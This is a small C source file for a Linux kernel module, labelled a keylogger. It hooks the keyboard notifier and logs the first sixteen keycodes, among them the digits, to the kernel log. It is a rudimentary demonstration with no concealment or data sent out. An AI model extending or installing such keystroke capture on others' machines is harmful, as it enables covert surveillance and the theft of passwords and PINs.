// keylogger kernel module
// Robert Peters 2009-07-08
///////////////////////////

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>

static char*
keycodes[] =
{
  "",
  "ESC",
  "1",
  "2",
  "3",
  "4",
  "5",  
  "6",
  "7",
  "8",
  "9",
  "0",
  "-",
  "=",
  "BS",
  "TAB"
};

static int
key_callback(struct notifier_block *self, unsigned long val, void *data)
{
  unsigned int key = ((struct keyboard_notifier_param*) data)->value;

  if(key < 16)
  {
    printk("key_callback: key=%s\n", keycodes[key]);
  }

  return NOTIFY_DONE;
}

static struct
notifier_block key_notifier =
{
  .notifier_call = key_callback
};

int
key_init(void)
{
	printk(KERN_INFO "start klmodule\n");
  register_keyboard_notifier(&key_notifier);
	return 0;
}
 
void
key_exit(void)
{
	printk(KERN_INFO "stop klmodule\n");
  unregister_keyboard_notifier(&key_notifier);
}

module_init(key_init);
module_exit(key_exit);
MODULE_LICENSE("GPL");
